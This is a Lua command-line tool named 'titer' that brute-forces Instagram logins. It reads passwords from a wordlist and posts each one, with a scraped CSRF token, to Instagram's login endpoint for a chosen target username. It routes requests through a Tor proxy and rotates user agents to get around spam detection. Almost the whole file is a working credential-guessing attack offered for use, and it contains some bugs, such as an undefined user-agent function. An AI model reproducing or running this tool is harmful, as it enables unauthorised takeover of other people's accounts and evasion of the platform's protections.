#!/usr/bin/lua
local argparse = require('argparse') 
local http = require('socket.http') 
local ltn = require('ltn12')
local lib = require("lib/lib")

local titer = [[
                `         '
;,,,             `       '             ,,,;
`YES8888bo.       :     :       .od8888YES'
  888IO8DO88b.     :   :     .d8888I8DO88
  8LOVEY'  `Y8b.   `   '   .d8Y'  `YLOVE8
 jTHEE!  .db.  Yb. '   ' .dY  .db.  8THEE!
   `888  Y88Y    `b ( ) d'    Y88Y  888'
    8MYb  '"        ,',        "'  dMY8
   j8prECIOUSgf"'   ':'   `"?g8prECIOUSk
     'Y'   .8'     d' 'b     '8.   'Y'
      !   .8' db  d'; ;`b  db '8.   !
         d88  `'  8 ; ; 8  `'  88b
        d88Ib   .g8 ',' 8g.   dI88b
       :888LOVE88Y'     'Y88LOVE888:
       '! THEE888'       `888THEE !'
          '8Y  `Y         Y'  Y8'
           Y                   Y
           !                   !
  https://github.com/sudurraaa/titer
]]

local request_payload = [[queryParams={}&optIntoOneTap=false]]
local csrf = nil
local request_headers = nil

local function get_proxy_server()
	local proxy = {
		"127.0.0.1:9050"
	}
	return (proxy[math.random(#proxy)])
end

local function get_csrf_token()
	repeat
		body,code,headers = http.request {
			url = "https://instagram.com/accounts/login/",
			method = "GET",
			headers = request_headers
		}	
	until (type(headers == table))
	for _,cooks in pairs(headers) do
		if cooks:find("csrftoken") then
			csrf = cooks:match("csrftoken=.*"):sub(11, -485)
			break
		end
	end
	return csrf
end


local function attack(password, proxy)
	-- Generating fake user igent
	request_payload = request_payload .. "&enc_password=#PWD_INSTAGRAM_BROWSER:0:" .. os.time() .. ":" .. password
	request_headers["User-Agent"] = fake_Agents()

	local attack_response = {}
	http.request {
		url = "https://instagram.com/accounts/login/ajax/",
		method = "POST",
		headers = request_headers,
		proxy = proxy,
		source = ltn.source.string(request_payload),
		sink = ltn.sink.table(attack_response)
	}
	for _,resp in pairs(attack_response) do
		print(resp)
		return resp
	end
end

local function main()
    local parser = argparse() {
    	name = "titer",
    	description = titer,
    	epilog = "Usage: titer -t blackarch -w wordlist.txt" 
    }
	
    parser:option('-t --target', "Specify target instagram username")
    parser:option('-w --wordlist', "Specify wordlist file path")
    parser:flag('-v --version', "Get current version of soft"):action(function()
    	print("titer v1.0.0(alpha)")
    	os.exit(0)
    end)
    parser:flag('-a --asci', 'Print titer ascii'):action(function()
		print(titer)
		os.exit(1)
    end)
    local args = parser:parse()
	
	-- Checking if all arguments exists TODO if not args.proxy doesn't work
    if not args.target then
    	parser:error("no target specifyed\nExample: titer -t blackarch -w wordlist.txt -p disable")
    elseif args.wordlist == nil then
    	parser:error("no wordlist file specifyed\nExample: titer -t blackarch -w wordlist.txt -p disable")
    elseif args.wordlist then
    	local words = io.open(args.wordlist)
    	if not words then
    		parser:error(args.wordlist .. " wordlist path doesn't found")
    	end
	end
    -- Making http request to instagram to get csrf token
    request_payload = request_payload .. "&username=" .. args.target
    request_headers = {
    	["content-type"] = "application/x-www-form-urlencoded",
    	["X-Requested-With"] = "XMLHttpRequest",
    	["Referer"] = "http://www.instagram.com/accounts/login",
    }--]]
	request_headers["x-csrftoken"] = get_csrf_token()
    -- Checking if --wordlist exist TODO find better way with argparse
	for pass in io.lines(args.wordlist) do
		attack(pass, get_proxy_server())
		if (attack(pass, "enable")):find("message") then
			print("[-] instagram detected spam attack\n[+] generating new user-agent")
			request_headers["User-Agent"] = fake_Agents()
			print("[+] getting new csrf-token")
			request_headers["x-csrftoken"] = get_csrf_token()
			print("[+] changing proxy server")
		end
	end
end

main()
